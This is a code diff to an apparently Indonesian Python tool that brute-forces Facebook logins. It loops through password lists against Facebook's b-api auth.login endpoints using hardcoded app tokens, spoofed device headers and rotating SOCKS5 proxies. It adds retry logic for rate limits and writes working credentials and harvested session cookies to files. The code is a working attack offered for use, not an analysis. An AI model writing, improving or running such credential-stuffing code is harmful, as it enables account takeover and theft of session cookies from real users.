@@ -1553,51 +1553,27 @@ def metcepat():
 
 
 #-------------------[ CRACK-MAIN ]------------#
-import requests
-import json
-
 def b_api(idf, pwv):
     global loop, ok, cp
+    bo = random.choice([m, k, h, b, u, x])
+    rr = random.randint
+    rc = random.choice
     ses = requests.Session()
     prog.update(des, description=f" {K2}•{H2} FANKY GRAPH {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
+    #ua = f"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
     ua = random.choice(ugen)
-    # ua = 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 [FBAN/FB4A;FBAV/300.1.0.58.129;FBBV/247967041;FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBDV/SM-G973F;FBSV/10;FBCA/arm64-v8a:;FBDM/{density=2.625}]'
-    headers = {
-        'User-Agent': ua,
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Accept': 'application/json',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Connection': 'keep-alive',
-        'Referer': 'https://www.facebook.com/',
-        'Origin': 'https://www.facebook.com',
-        'Host': 'b-api.facebook.com',
-        'X-Requested-With': 'XMLHttpRequest',
-        'DNT': '1',
-        'TE': 'Trailers'
-    }
-    
     for pw in pwv:
         try:
-            # Mengirim POST request menggunakan requests.Session().post
-            url = 'https://b-api.facebook.com/method/auth.login'
-            params = {
-                'access_token': '237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1',
-                'format': 'json',
-                'sdk_version': '2',
-                'email': idf,
-                'locale': 'en_US',
-                'password': pw,
-                'sdk': 'ios',
-                'generate_session_cookies': '1',
-                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'
-            }
-            
-            response = ses.post(url, headers=headers, data=params)
-            fannn = response.json()
-            
-            # Pengecekan akun
-            if 'User must verify their account' in fannn['error_msg']:
+            if 'ya' in ualuh: 
+                ua = ualu[0]
+            nip = random.choice(prox)
+            proxs = {'http': 'socks5://' + nip}
+            params = ({ "access_token": "237759909591655|25257C0f140aabedfb65ac27a739ed1a2263b1", "sdk_version": random.randint(1, 26), "email": idf, "locale": "en_US", "password": pw, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6" })
+            headers = ({ "Host": url, "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
+            post = ses.post(f"https://b-api.facebook.com/method/auth.login/", params=params, headers=headers, allow_redirects=False,proxies=proxs)
+
+            if "User must verify their account" in post.text:
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
@@ -1607,25 +1583,29 @@ def b_api(idf, pwv):
                 open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                 break
 
-            elif "access_token" in fannn:
+            elif "session_key" in post.text and "EAA" in post.text:
                 ok += 1
-                fannnnnn_cookies = sorted(fannn["session_cookies"], key=lambda x: (x["name"] != "datr", x["name"]))
-                kuki = ";".join(i["name"] + "=" + i["value"] for i in fannnnnn_cookies)
+                kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
                 tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                 tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                 prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                 break
+
+            elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
+                prog.update(des, description=f" {K2}•{K2} SPAM {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]", end="")
+                prog.advance(des)
+                time.sleep(10)
 
             else:
                 continue
-                
+
         except requests.exceptions.ConnectionError:
             time.sleep(31)
-            
+
     loop += 1
 	
 #-------------------[ CRACK-MAIN ]------------#
@@ -1647,7 +1627,7 @@ def fankygraphv1(idf, pwv, url):
             proxs = {'http': 'socks5://' + nip}
             params = ({ "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": random.randint(1, 26), "email": idf, "locale": "zh_CN", "password": pw, "sdk": "Android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5" })
             headers = ({ "Host": url, "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
-            post = requests.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False,proxies=proxs)
+            post = ses.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False,proxies=proxs)
 
             if "User must verify their account" in post.text:
                 cp += 1
